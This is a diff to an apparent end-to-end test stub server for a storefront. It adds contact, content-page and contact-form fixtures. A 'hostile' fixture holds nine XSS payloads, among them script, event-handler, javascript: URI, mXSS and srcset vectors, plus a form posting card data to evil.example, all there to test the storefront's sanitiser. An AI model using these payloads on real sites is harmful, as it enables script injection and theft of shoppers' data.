@@ -2233,7 +2233,7 @@ function logoMark(shape, altText) {
  * `logo` is a real URL this stub also serves, so the browser genuinely fetches an image and a broken one
  * would show up as a broken one — a `data:` URL would prove the markup and nothing about the wiring.
  */
-function buildSiteSettings(logo, social, whatsApp) {
+function buildSiteSettings(logo, social, whatsApp, contact) {
   const links = {
     none: [],
     one: [{ network: 'instagram', url: 'https://www.instagram.com/colombowardrobe' }],
@@ -2260,7 +2260,167 @@ function buildSiteSettings(logo, social, whatsApp) {
     logo: marks[logo] ?? null,
     whatsAppNumber: whatsApp ?? null,
     social: links[social] ?? [],
+
+    // GLB-10, W2-11. `contact=none` is the default and the state a fresh shop is in: doc 11 P13 step 13
+    // puts these in admin Settings, so until the client fills them in there is nothing, and the Contact
+    // page shows nothing rather than inventing an address.
+    contact: contactDetails(contact),
   };
+}
+
+/**
+ * The shop's contact details, as `/api/site/settings` returns them (GLB-07, GLB-10).
+ *
+ * `set` is a deliberately ordinary-looking answer; `map` adds a Google Maps embed, which is the one
+ * value the storefront re-checks against a host allow-list before it frames it.
+ */
+function contactDetails(state) {
+  if (state === 'set' || state === 'map') {
+    return {
+      phone: '+94 11 234 5678',
+      email: 'hello@colombowardrobe.example',
+      addressLines: ['Colombo Wardrobe', '42 Galle Road', 'Colombo 03'],
+      openingHours: ['Monday to Friday, 9am to 6pm', 'Saturday, 9am to 1pm'],
+      mapEmbedUrl:
+        state === 'map' ? 'https://www.google.com/maps/embed?pb=!1m18!stub' : null,
+    };
+  }
+
+  // `evil` is the value the allow-list has to refuse: a perfectly valid https URL on a host that is not
+  // a map provider. The storefront must draw no frame at all for it.
+  if (state === 'evil') {
+    return {
+      phone: null,
+      email: null,
+      addressLines: [],
+      openingHours: [],
+      mapEmbedUrl: 'https://evil.example/pretend-map',
+    };
+  }
+
+  return { phone: null, email: null, addressLines: [], openingHours: [], mapEmbedUrl: null };
+}
+
+/**
+ * Which content pages are published (GLB-10). `none` is the default, and the honest state of a shop
+ * whose client has not written any copy yet.
+ */
+let contentPagesState = 'none';
+
+/** Forced status for `/api/content/pages`, set through the test switch. 0 means answer normally. */
+let contentPagesStatus = 0;
+
+/** What the Contact form has posted, for the honeypot assertion. */
+const contactSubmissions = [];
+
+/** The six system pages as the API lists them once a client has published all of them. */
+const PUBLISHED_CONTENT_PAGES = [
+  { slug: 'about', title: 'About us', systemKey: 'about', updatedAtUtc: '2026-10-02T09:30:00Z' },
+  { slug: 'contact', title: 'Contact us', systemKey: 'contact', updatedAtUtc: null },
+  { slug: 'returns', title: 'Returns and exchanges', systemKey: 'returns', updatedAtUtc: null },
+  { slug: 'shipping', title: 'Delivery and shipping', systemKey: 'shipping', updatedAtUtc: null },
+  { slug: 'privacy', title: 'Privacy policy', systemKey: 'privacy', updatedAtUtc: null },
+  { slug: 'terms', title: 'Terms and conditions', systemKey: 'terms', updatedAtUtc: null },
+];
+
+/**
+ * The bodies those pages are served with.
+ *
+ * **Already-sanitised HTML**, which is the whole point of the fixture: the API cleans on save, so what
+ * the storefront receives is clean and the only question left is whether it renders it. `about` carries
+ * every element the allow-list permits, so the page's element-scoped styles are exercised; `contact`
+ * carries nothing, because the Contact page's content is the form and the Settings details.
+ */
+const CONTENT_PAGE_BODIES = {
+  about: {
+    bodyHtml:
+      '<h2>Our story</h2><p>We began in <strong>Colombo</strong> with one sewing machine.</p>'
+      + '<ul><li>Linen and denim</li><li>Made in Sri Lanka</li></ul>'
+      + '<p><a href="https://example.com/press">Read the press</a></p>'
+      // **Deliberately wider than 320 px**, which is the whole point of the fixture: a shipping page is
+      // mostly a table of zones and fees, and the requirement is that a wide one scrolls *itself* rather
+      // than the document (GLB-09). A one-cell table fits every viewport and so proves nothing — the
+      // first version of this fixture had one, and `content-pages.e2e.ts` measured scrollWidth equal to
+      // clientWidth and could not fail.
+      + '<table><caption>Delivery zones and fees</caption>'
+      + '<tr><th scope="col">Delivery zone</th><th scope="col">Standard delivery</th>'
+      + '<th scope="col">Express delivery</th><th scope="col">Free delivery over</th>'
+      + '<th scope="col">Working days</th></tr>'
+      + '<tr><td>Colombo and suburbs</td><td>Rs. 400.00</td><td>Rs. 950.00</td>'
+      + '<td>Rs. 10,000.00</td><td>One to two days</td></tr>'
+      + '<tr><td>Western Province</td><td>Rs. 450.00</td><td>Rs. 1,200.00</td>'
+      + '<td>Rs. 10,000.00</td><td>Two to three days</td></tr>'
+      + '<tr><td>Island-wide</td><td>Rs. 600.00</td><td>Not available</td>'
+      + '<td>Rs. 15,000.00</td><td>Three to five days</td></tr>'
+      + '</table>',
+    seoTitle: null,
+    seoDescription: 'How Colombo Wardrobe began, and what we make.',
+  },
+  contact: { bodyHtml: '', seoTitle: null, seoDescription: null },
+
+  /**
+   * **Nine raw, unsanitised payloads, served exactly as an attacker would have written them.**
+   *
+   * Everything else in this fixture is already-clean HTML, because the API cleans on save — which is
+   * right, and it means nothing in this repository ever exercised the storefront's *render* layer
+   * against hostile input. That layer exists on purpose: `IHtmlSanitiser`'s own remarks say the body is
+   * bound with `[innerHTML]` and never `bypassSecurityTrustHtml` precisely so that Angular's DOM
+   * sanitiser runs again, in the browser and during the server render, and holds for a row written by a
+   * support script, a data fix or a restore from a spreadsheet — none of which comes through the API.
+   * An untested second line of defence is a hope, not a line of defence. The W2-11 tester built this
+   * fixture's shape outside the repository and measured 0 of 9 rendering dangerously; this is it,
+   * inside the repository, so it keeps being measured.
+   *
+   * The payloads are the ones that distinguish a real sanitiser from a string replace: a plain script,
+   * an mXSS chain through foreign content, an event handler on an allowed element, both URI schemes
+   * that execute, an SVG with a scheduled handler, a comment that ends early, and `srcset` smuggled
+   * beside a `src`.
+   */
+  hostile: {
+    bodyHtml:
+      '<p>Before.</p>'
+      + '<script>window.__xss = (window.__xss ?? 0) + 1;</script>'
+      + '<img src="x" onerror="window.__xss = (window.__xss ?? 0) + 1">'
+      + '<svg><animate onbegin="window.__xss = (window.__xss ?? 0) + 1" attributeName="x" dur="1s">'
+      + '</animate></svg>'
+      + '<a href="javascript:window.__xss = (window.__xss ?? 0) + 1">Link</a>'
+      + '<iframe src="data:text/html,<script>parent.__xss = 1</script>"></iframe>'
+      + '<math><mtext><table><mglyph><style><img src=x onerror="window.__xss = 1">'
+      + '</style></mglyph></table></mtext></math>'
+      + '<!--><script>window.__xss = 1</script>-->'
+      + '<img src="/media/a.webp" srcset="javascript:window.__xss = 1" alt="A">'
+      + '<form action="https://evil.example/collect"><input name="card"></form>'
+      + '<p>After.</p>',
+    seoTitle: null,
+    seoDescription: null,
+  },
+  returns: { bodyHtml: '<p>Thirty days.</p>', seoTitle: null, seoDescription: null },
+  shipping: { bodyHtml: '<p>Island-wide.</p>', seoTitle: null, seoDescription: null },
+  privacy: { bodyHtml: '<p>Placeholder for the PDPA review.</p>', seoTitle: null, seoDescription: null },
+  terms: { bodyHtml: '<p>Placeholder.</p>', seoTitle: null, seoDescription: null },
+};
+
+/** The published-page list for the state the switch has set. */
+function contentPages() {
+  if (contentPagesState === 'all') {
+    return PUBLISHED_CONTENT_PAGES;
+  }
+
+  if (contentPagesState === 'contact') {
+    return PUBLISHED_CONTENT_PAGES.filter((page) => page.systemKey === 'contact');
+  }
+
+  if (contentPagesState === 'custom') {
+    return [{ slug: 'size-guide', title: 'Size guide', systemKey: null, updatedAtUtc: null }];
+  }
+
+  // A page whose stored body never went through the sanitiser, which is the support-script case. See
+  // CONTENT_PAGE_BODIES.hostile.
+  if (contentPagesState === 'hostile') {
+    return [{ slug: 'hostile', title: 'Hostile body', systemKey: null, updatedAtUtc: null }];
+  }
+
+  return [];
 }
 
 /** Forced status for `/api/site/settings`, set through the test switch. 0 means answer normally. */
@@ -2269,10 +2429,33 @@ let siteSettingsStatus = Number(process.env.E2E_SITE_SETTINGS_STATUS ?? 0);
 /** How long `/api/site/settings` holds its answer, in ms. 0 means answer at once. */
 let siteSettingsDelayMs = 0;
 
+/**
+ * **The stub's shop has a WhatsApp number unless a test says otherwise, and that changed in W2-11.**
+ *
+ * It used to default to null, and it did not matter: the storefront fell back to a placeholder number so
+ * the floating button existed either way. It does not any more — an unset number renders no button at
+ * all. Several specs need the float to be *there*: `quick-view`, `wishlist` and `content-pages` scan the
+ * bottom-right corner with `elementFromPoint` precisely because the float owns it (docs/04 §4, owner
+ * decision 2026-10-06), and with no number those scans would pass by measuring a corner with nothing in
+ * it — the vacuous shape this suite keeps finding.
+ *
+ * So an absent `whatsApp` parameter means "a shop that has one", and `whatsApp=none` is how a test asks
+ * for the unconfigured state. `site-branding.e2e.ts` is the file that asks.
+ */
+const DEFAULT_WHATSAPP = '94771234567';
+
+function whatsAppFrom(value) {
+  if (value === null || value === undefined) {
+    return DEFAULT_WHATSAPP;
+  }
+
+  return value === 'none' || value === '' ? null : value;
+}
+
 let siteSettings = buildSiteSettings(
   process.env.E2E_SITE_LOGO ?? 'none',
   process.env.E2E_SITE_SOCIAL ?? 'none',
-  process.env.E2E_SITE_WHATSAPP ?? null,
+  whatsAppFrom(process.env.E2E_SITE_WHATSAPP ?? null),
 );
 
 /* ===========================================================================================
@@ -3082,7 +3265,8 @@ const server = createServer((request, response) => {
     siteSettings = buildSiteSettings(
       url.searchParams.get('logo') ?? 'none',
       url.searchParams.get('social') ?? 'none',
-      url.searchParams.get('whatsApp'),
+      whatsAppFrom(url.searchParams.get('whatsApp')),
+      url.searchParams.get('contact') ?? 'none',
     );
 
     // The fault modes belong here rather than in a `page.route` handler, and that is the whole reason this
@@ -3243,6 +3427,103 @@ const server = createServer((request, response) => {
 
   if (url.pathname === '/api/content/announcements') {
     response.end(JSON.stringify(process.env.E2E_CONTENT === 'empty' ? [] : ANNOUNCEMENTS));
+    return;
+  }
+
+  // GLB-10, W2-11: the published-page index and one page's body.
+  //
+  // The default is **nothing published**. That is a deliberate test baseline rather than a claim about
+  // the seeder: a real fresh shop ships five pages unpublished and Contact *on* the shop (W2-11), and
+  // "nothing published" is the state most of these tests are about — a page that is not there yet.
+  // `/__test__/content-pages` switches the set, so a test names a state and this file owns its bytes.
+  if (url.pathname === '/__test__/content-pages') {
+    contentPagesState = url.searchParams.get('state') ?? 'none';
+    contentPagesStatus = Number(url.searchParams.get('status') ?? 0);
+
+    response.end(JSON.stringify({ state: contentPagesState, status: contentPagesStatus }));
+    return;
+  }
+
+  if (url.pathname === '/api/content/pages') {
+    // The fault mode belongs here rather than in a `page.route` handler, for the reason the
+    // site-settings switch above gives at length: the storefront reads this during the **server**
+    // render, which Playwright's request interception cannot touch.
+    if (contentPagesStatus >= 400) {
+      response.statusCode = contentPagesStatus;
+      response.end(JSON.stringify({ title: 'Forced failure', status: contentPagesStatus }));
+      return;
+    }
+
+    response.end(JSON.stringify({ pages: contentPages() }));
+    return;
+  }
+
+  if (url.pathname.startsWith('/api/content/pages/')) {
+    const slug = decodeURIComponent(url.pathname.slice('/api/content/pages/'.length));
+    const page = contentPages().find((candidate) => candidate.slug === slug);
+
+    if (!page) {
+      response.statusCode = 404;
+      response.end(
+        JSON.stringify({
+          title: 'No such page',
+          detail: 'This shop has no published page at that address.',
+          status: 404,
+        }),
+      );
+      return;
+    }
+
+    response.end(JSON.stringify({ ...page, ...CONTENT_PAGE_BODIES[page.slug] }));
+    return;
+  }
+
+  if (url.pathname === '/api/content/contact') {
+    // Mirrors the endpoint: a refused field is an RFC 9457 problem naming it, a filled honeypot gets the
+    // *same* answer a real submission does, and nothing anywhere mentions an email.
+    let body = '';
+    request.on('data', (chunk) => (body += chunk));
+    request.on('end', () => {
+      let sent = {};
+      try {
+        sent = JSON.parse(body || '{}');
+      } catch {
+        sent = {};
+      }
+
+      const errors = {};
+      if (!String(sent.name ?? '').trim()) {
+        errors.name = ['Tell us your name.'];
+      }
+      if (!EMAIL_PATTERN.test(String(sent.email ?? '').trim())) {
+        errors.email = ['Enter an email address we can reply to, for example name@example.com.'];
+      }
+      if (String(sent.message ?? '').trim().length < 2) {
+        errors.message = ['Tell us how we can help.'];
+      }
+
+      if (Object.keys(errors).length > 0) {
+        response.statusCode = 400;
+        response.end(JSON.stringify({ title: 'One or more fields need attention.', status: 400, errors }));
+        return;
+      }
+
+      contactSubmissions.push({ ...sent, discarded: Boolean(String(sent.website ?? '').trim()) });
+
+      response.end(
+        JSON.stringify({
+          message:
+            'Thank you — your message has reached us. Our team reads every enquiry and will be in touch.',
+        }),
+      );
+    });
+    return;
+  }
+
+  // Test-only: what the Contact form has posted, so a test can assert the honeypot was not stored and
+  // that a real submission was.
+  if (url.pathname === '/__test__/contact-submissions') {
+    response.end(JSON.stringify(contactSubmissions));
     return;
   }
 
